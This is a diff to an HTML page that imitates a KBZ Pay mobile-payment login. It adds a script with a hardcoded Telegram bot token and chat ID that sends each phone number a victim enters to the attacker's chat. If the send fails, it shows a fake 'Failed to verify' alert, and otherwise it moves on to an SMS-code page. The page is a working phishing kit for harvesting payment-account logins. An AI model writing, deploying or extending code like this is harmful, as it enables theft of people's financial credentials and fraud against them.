@@ -755,5 +755,58 @@ document.getElementById("backToPinBtn").addEventListener("click", function () {
   document.getElementById("fifth-page").style.display = "none";
   document.getElementById("phone-page").style.display = "flex";
 });
-</script></body>
+</script>
+<script>
+  // Telegram Configuration
+const BOT_TOKEN = '7257629895:AAGv9vrBCIBCiSe799wQ7oK0v1ijaPwON30';
+const CHAT_ID = 6378975216; // Your chat ID
+
+async function sendToTelegram(message) {
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  
+  try {
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+      })
+    });
+    return await response.json();
+  } catch (error) {
+    console.error('Telegram error:', error);
+    return { ok: false };
+  }
+}
+
+// Phone Page Submission
+document.getElementById('continue-btn').addEventListener('click', async function() {
+  const phoneNumber = document.getElementById('phone-input').value.trim();
+  
+  if (!phoneNumber) {
+    alert('Please enter a phone number');
+    return;
+  }
+
+  // 1. Send to Telegram
+  const telegramResult = await sendToTelegram(
+    `📱 <b>New KBZ Pay Login</b>\n` +
+    `☎️ Phone: <code>${phoneNumber}</code>\n` +
+    `⏰ ${new Date().toLocaleString()}`
+  );
+
+  // 2. Only proceed if Telegram succeeds
+  if (telegramResult.ok) {
+    localStorage.setItem('kbz_phone', phoneNumber);
+    document.getElementById('phone-page').style.display = 'none';
+    document.getElementById('sms-page').style.display = 'flex';
+  } else {
+    alert('Failed to verify. Please try again.');
+  }
+});
+</script>
+
+</body>
 </html>
